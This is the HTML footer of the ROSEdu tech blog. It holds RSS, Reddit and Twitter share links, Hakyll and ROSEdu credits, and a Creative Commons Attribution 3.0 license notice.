      <footer class="the-footer">
        <div class="unit-foot">
          <div class="unit-inner unit-foot-inner">
            <div class="misc vcard">
              <h4>Social</h4>
              <div class="rss">
                <a href="http://techblog.rosedu.org/rss.xml" target="_blank">
                  <img src="./images/rss.png" alt="Subscribe to RSS Feed" />
                </a>
                <a href="http://www.reddit.com/submit?url='+encodeURIComponent(window.location)" target="_blank" onclick="window.location='http://www.reddit.com/submit?url='+encodeURIComponent(window.location); return false">
                  <img src="./images/reddit.png" alt="Submit to Reddit" />
                </a>
                <a href="http://twitter.com/share" class="twitter-share-button" data-count="none" target="_blank">
                  <img src="./images/twitter.png" alt="Submit to Twitter" />
                </a>
              </div>

              <h4>Powered by</h4>
              <ul>
                <li class="contact">
                  <address>
                    <a class="author fn n" href="http://www.rosedu.org">ROSEdu</a>
                  </address>
                </li>
                <li class="contact">
                  <address>
                    <a class="author fn n" href="http://jaspervdj.be/hakyll">Hakyll</a>
                  </address>
                </li>
              </ul>

              <h4>License</h4>
              <div class="bucket">
                <span>
                  <a rel="license" href="http://creativecommons.org/licenses/by/3.0/" title="Creative Commons Attribution 3.0 License">
                    <img src="//i.creativecommons.org/l/by/3.0/88x31.png" alt="License">
                  </a>
                </span>
                <span>
                  This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/3.0/" class="subfoot">Creative Commons Attribution 3.0 License</a>.
                </span>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  </body>
</html>
